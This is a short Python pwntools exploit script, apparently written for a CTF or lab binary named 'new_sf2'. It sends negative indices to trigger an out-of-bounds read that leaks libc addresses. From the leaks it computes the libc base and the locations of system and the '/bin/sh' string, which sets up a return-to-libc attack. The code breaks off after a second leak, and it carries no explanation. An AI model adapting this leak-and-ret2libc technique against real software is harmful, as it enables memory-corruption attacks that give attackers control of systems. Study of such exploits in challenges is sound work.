from pwn import *
p = process("./new_sf2")
time = 0.05
p.sendline(b"1")
sleep(time)
p.sendline(b'-96')
sleep(time)
p.recvuntil(b"Value : ")
leak = u32(p.recv(4))
print(hex(leak))

libcbase = leak - 0x49680
sys_leak = libcbase + 0x3adb0
bin_sh_leak = libcbase + 0x15bb2b

input("stop")

sleep(time)
p.sendline(b'1')
sleep(time)
p.sendline(b'-100')
p.recvuntil(b"Value : ")
puts_leak = u32(p.recv(4))

print(hex(puts_leak))

